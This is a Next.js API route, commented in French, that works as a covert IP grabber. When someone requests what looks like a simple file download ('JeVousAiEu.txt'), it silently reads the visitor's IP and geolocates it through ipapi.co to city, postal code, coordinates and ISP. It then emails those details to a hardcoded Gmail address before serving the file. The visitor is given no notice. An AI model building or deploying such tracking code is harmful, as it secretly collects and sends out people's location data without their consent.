import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

export async function POST(req: Request) {
    try {
        const forwarded = req.headers.get('x-forwarded-for');
        const ip = forwarded ? forwarded.split(',')[0] : 'IP non disponible';

        // Si l'IP est disponible, faire une requête à ipapi pour récupérer la localisation
        let locationData = null;
        if (ip && ip !== 'IP non disponible' && ip !== '::1') {  // Ne pas tenter de géolocaliser l'adresse locale
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                if (response.ok) {
                    locationData = await response.json();
                } else {
                    console.error("Erreur lors de la requête API ipapi :", response.status);
                }
            } catch (error) {
                console.error("Erreur lors de la récupération des données de localisation :", error);
            }
        }

        // Préparer les informations de localisation
        const locationInfo = locationData && locationData.country_name ? `
            Pays: ${locationData.country_name || 'Non disponible'}
            Région: ${locationData.region || 'Non disponible'}
            Ville: ${locationData.city || 'Non disponible'}
            Code postal: ${locationData.postal || 'Non disponible'}
            Latitude: ${locationData.latitude || 'Non disponible'}
            Longitude: ${locationData.longitude || 'Non disponible'}
            FAI: ${locationData.org || 'Non disponible'}
        ` : 'Localisation non disponible';

        // Configuration de Nodemailer
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.GMAIL_USER,
                pass: process.env.GMAIL_PASS,
            },
        });

        // Contenu de l'e-mail
        const mailOptions = {
            from: process.env.GMAIL_USER,
            to: 'leo0609leo@gmail.com', // Changez par votre adresse e-mail
            subject: `Nouvelle adresse IP : ${ip}`,
            text: `Voici les informations de l'utilisateur :\n
            Adresse IP: ${ip}\n
            Localisation:\n${locationInfo}`,
        };

        // Envoyer l'e-mail une seule fois
        await transporter.sendMail(mailOptions);

        // Chemin du fichier local à télécharger
        const filePath = path.join(process.cwd(), 'JeVousAiEu.txt'); // Chemin vers ton fichier à la racine
        if (!fs.existsSync(filePath)) {
            return NextResponse.json({ message: 'Fichier non trouvé' }, { status: 404 });
        }

        // Lire le contenu du fichier
        const fileData = fs.readFileSync(filePath);

        // Créer les headers pour télécharger le fichier
        const headers = new Headers({
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename="JeVousAiEu.txt"',
        });

        // Retourner le fichier texte pour téléchargement
        return new Response(fileData, {
            headers,
        });

    } catch (error) {
        console.error(error);
        return NextResponse.json({ message: 'Erreur lors de l\'envoi de l\'e-mail ou du téléchargement du fichier' }, { status: 500 });
    }
}
